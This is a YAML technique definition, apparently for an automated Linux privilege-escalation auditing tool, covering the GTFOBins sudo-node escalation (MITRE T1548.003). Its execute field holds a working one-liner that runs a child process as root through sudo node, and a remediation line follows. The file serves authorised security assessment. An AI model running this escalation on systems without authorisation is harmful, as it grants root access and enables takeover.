# Sudo → root via node (GTFOBins)
technique: T1548.003
name: Sudo → root via node (GTFOBins)
tactic: [privilege-escalation]
platform: [linux]
ranking:
  exploitability: high
  safety: read-only
  detection: quiet
detect:
  sudo_allows: node
execute:
  command: |-
    sudo node -e 'require("child_process").execSync("id",{stdio:[0,1,2]})'
verify:
  success: "uid=0"
cleanup:
  command: ""
report:
  vector_type: gtfobins_sudo
  description: >
    Sudo NOPASSWD on `node` — arbitrary child_process.execSync as root.
  remediation: >
    Drop `node` from sudoers.
  refs: [T1548.003, GTFOBins/node]
